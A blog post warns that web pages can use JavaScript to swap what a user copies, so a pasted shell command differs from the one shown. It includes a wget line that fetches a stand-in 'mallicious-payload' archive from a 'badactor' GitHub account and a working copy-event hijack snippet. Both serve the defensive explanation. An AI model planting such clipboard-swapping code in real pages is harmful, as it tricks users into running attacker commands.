---
title: "Beware copy/pasting code or commands from the internet"
description: You never really know what is being added to your clipboard...
date: 2020-10-19'
modified_date: "2021-03-19"
image: /assets/images/posts/arget-zvHhKiVuR9M-unsplash.jpg
status: published
---

Cover photo by [Arget](https://unsplash.com/@arget?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText") on [Unsplash](https://unsplash.com/)

Credit to [https://briantracy.xyz/writing/copy-paste-shell.html](https://briantracy.xyz/writing/copy-paste-shell.html) for bringing the topic/issue to my attention!

---

## The Problem

As an avid Linux‘er and Windows Power User where it is commonplace to copy & paste code/scripts/commands from tutorials and help sites, it always intrigues me how bad actors find ways of exploiting users in way’s I haven’t considered before.

An example of this from Brian Tracy is how the data you “copy” from a website isn’t necessarily what ends up in your Clipboard for pasting!

With just a few additional lines of JavaScript/code to a website, you can make it so that when a user performs a Copy action, the actual text copied to the clipboard is not the actual text you were trying to copy.

## How does it happen?

A real-world example of this may be some lines of code for installing a package on Debian where the code is perfectly innocent (don’t worry if you don’t understand it – this is just for demo purposes):

```bash
wget https://github.com/tim/super-awesome-package/super-awesome-package.tar.gz
tar xvzf super-awesome-package.tar.gz
```

This code is perfectly innocent and does exactly what it says on the tin, but with this example and a bad actor in play, you could end up with something like the following actually in your Clipboard, where instead of grabbing the intended package from Github, it’s actually grabbing something more sinister and renaming the asset as the intended one:

```bash
wget super-awesome-package.tar.gz https://github.com/badactor/mallicious-payload.tar.gz
tar xvzf super-awesome-package.tar.gz
```

Here is an example of how the switch can be made and the malicious code can be injected with a couple of lines of JavaScript in the webpage:

```javascript
document.querySelector('#ExampleCode').addEventListener('copy', evtCopy => {
    evtCopy.clipboardData.setData('text/plain',
        'sudo wget https://github.com/tim/super-awesome-package/super-awesome-package.tar.gz
 \n sudo tar xvzf super-awesome-package.tar.gz \n sudo another command \n echo done'
    );
    evtCopy.preventDefault();
});
```

In the above snippet, the bad actor copies the malicious code to the Clipboard, and by ending each command with a New Line `\n` character, the shell will normally execute the next line automatically and happen so quickly that you may not even spot the swap.

## Solutions?

- While it may be a drag to do so, a simple way to combat this problem would be to have a text file open that you can paste into before pasting into the console to ensure there are no extra lines of code being added or replaced.
- Another way to combat it would be to type the commands out by hand (I used to do this a lot when I first started using Linux as I found the process of typing the whole command out from scratch helped me to pick things).

If you have any ideas, suggestions or solutions to this - please get in touch and I'll add them onto my post with a credit to you! 😊
